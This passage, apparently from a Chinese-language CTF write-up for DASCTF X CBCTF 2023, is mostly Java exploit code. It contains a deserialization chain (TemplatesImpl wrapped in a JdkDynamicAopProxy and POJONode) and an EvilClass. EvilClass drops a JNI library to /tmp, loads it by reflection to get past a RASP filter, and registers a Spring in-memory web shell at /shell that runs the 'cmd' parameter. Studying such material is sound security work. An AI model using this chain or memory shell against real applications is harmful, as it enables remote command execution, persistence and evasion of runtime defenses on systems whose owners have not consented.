class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> requestEntity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpEntity</span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span>requestHeaders<span class="token punctuation">)</span><span class="token punctuation">;</span>        RestTemplate restTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResponseEntity<span class="token operator">&lt;</span>String<span class="token operator">></span> res <span class="token operator">=</span> restTemplate<span class="token punctuation">.</span><span class="token function">postForEntity</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> requestEntity<span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">serial</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");</span>        <span class="token comment" spellcheck="true">//writeReplaceMethod.setAccessible(true);</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String base64String <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> base64String<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserial</span><span class="token punctuation">(</span>String data<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> base64decodedBytes <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>base64decodedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Base64Encode</span><span class="token punctuation">(</span>ByteArrayOutputStream bs<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String field<span class="token punctuation">,</span> Object arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        Field f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然后直接打过去即可：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123104850-apbkw9v.png" alt="image">​</p><p>注入成功后就可以执行命令了：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123104912-brrngpe.png" alt="image">​</p><p>不过这里还有一个RASP，如果往题目中打会是这样的回显：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123104937-zr3t9vm.png" alt="image">​</p><p>所以这里需要绕过RASP</p><p>‍</p><h3 id="第四个点：绕过RASP"><a href="#第四个点：绕过RASP" class="headerlink" title="第四个点：绕过RASP"></a>第四个点：绕过RASP</h3><p>绕过RASP常规的是通过system.load加载dll或者so进行命令执行的，但是这一题把load0给过滤了，所以只能利用反射的方法调用</p><p>详细的看之前写的JNI绕过RASP(<a href="http://qingfeng.tech/2023/11/23/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/">http://qingfeng.tech/2023/11/23/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/</a>)</p><p>不过做这一题有一个细节，必须要保证Java文件没有在packet下，否则就会报错：</p><pre class=" language-java"><code class="language-java">Handler dispatch failed<span class="token punctuation">;</span> nested exception is java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>UnsatisfiedLinkError<span class="token operator">:</span> org<span class="token punctuation">.</span>com<span class="token punctuation">.</span>byPassRASP<span class="token punctuation">.</span>Cmdclass<span class="token punctuation">.</span><span class="token function">execCmd</span><span class="token punctuation">(</span>Ljava<span class="token operator">/</span>lang<span class="token operator">/</span>String<span class="token punctuation">;</span><span class="token punctuation">)</span>Ljava<span class="token operator">/</span>lang<span class="token operator">/</span>String<span class="token punctuation">;</span></code></pre><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123210155-8y6d39s.png" alt="image">​</p><p>这里就是构造如图的目录结构：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123210301-46le4b2.png" alt="image">​</p><p>然后生成payload即可打通</p><p>似乎是无法获取到我们写的so文件，需要这个包和恶意的文件都没有packet的情况下生成paylaod才有效</p><p>先把EvilClass编译为class文件</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>RandomAccessFile<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Vector<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">execCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//恶意动态链接库文件的base64编码</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String EVIL_JNI_BASE64 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LIB_PATH <span class="token operator">=</span> <span class="token string">"/tmp/libcmd.so"</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> jniBytes <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>EVIL_JNI_BASE64<span class="token punctuation">)</span><span class="token punctuation">;</span>            RandomAccessFile randomAccessFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RandomAccessFile</span><span class="token punctuation">(</span>LIB_PATH<span class="token punctuation">,</span> <span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            randomAccessFile<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>jniBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            randomAccessFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span>            ClassLoader cmdLoader <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> classLoaderClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader$NativeLibrary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method load <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            load<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field field <span class="token operator">=</span> classLoaderClazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"nativeLibraries"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span> libs <span class="token operator">=</span> <span class="token punctuation">(</span>Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>            Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryCons <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            nativeLibraryCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object nativeLibraryObj <span class="token operator">=</span> nativeLibraryCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            libs<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">)</span><span class="token punctuation">;</span>            field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">,</span> libs<span class="token punctuation">)</span><span class="token punctuation">;</span>            load<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span>                    <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method2 <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            EvilClass springControllerMemShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springControllerMemShell<span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> hi<span class="token punctuation">)</span> <span class="token punctuation">{</span>            hi<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String execRes <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token function">execCmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>execRes<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在Poc0中获取他的bytes打进链子即可：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poc0</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ClassPool pool = ClassPool.getDefault();</span><span class="token comment" spellcheck="true">//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");</span><span class="token comment" spellcheck="true">//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");</span><span class="token comment" spellcheck="true">//        ctClass0.removeMethod(writeReplace);</span><span class="token comment" spellcheck="true">//        ctClass0.toClass();</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\IdeaProjects\\JavaChains\\target\\classes\\EvilClass.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Templates templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cons <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxyObj <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span 